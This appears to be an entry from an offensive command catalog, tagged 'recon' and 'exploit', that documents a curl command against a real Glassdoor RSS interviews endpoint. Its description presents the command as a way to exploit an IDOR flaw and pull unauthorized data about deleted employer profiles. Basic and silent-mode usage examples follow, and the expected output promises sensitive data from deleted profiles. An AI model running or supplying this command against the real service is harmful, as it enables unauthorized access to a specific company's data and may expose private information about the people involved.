---
id: cmd-curl-rss-access
data: >-
  curl "https://www.glassdoor.com/rss/interviews?employer_id=DELETED_ID" -o
  interviews.xml
tags:
  - web
  - recon
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.527Z'
verified: false
validated: true
submitted: true
---
# curl-access-rss-endpoint

## Command

```bash
curl "https://www.glassdoor.com/rss/interviews?employer_id=DELETED_ID" -o interviews.xml
```

## Description

This command uses curl to fetch an RSS feed from Glassdoor's interviews endpoint, targeting deleted employer IDs to exploit IDOR and retrieve unauthorized data. Replace DELETED_ID with the actual profile ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"https://www.glassdoor.com/rss/interviews?employer_id=DELETED_ID"` | The RSS URL with employer ID parameter | Yes |
| `-o interviews.xml` | Output file for the XML response | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.glassdoor.com/rss/interviews?employer_id=12345" -o interviews.xml
```

### Advanced Usage

```bash
curl -s "https://www.glassdoor.com/rss/interviews?employer_id=12345" | xmllint --format -
```

> Adds silent mode (-s) and pipes to xmllint for formatted XML output.

## Expected Output

XML content with <rss> root, including <item> elements detailing interviews such as titles, descriptions, and dates. If successful, sensitive data from deleted profiles is visible; errors indicate access denial.

## Related

- [[Related Procedure|procedures/Access-Deleted-Interview-Records-via-RSS-Endpoint]]
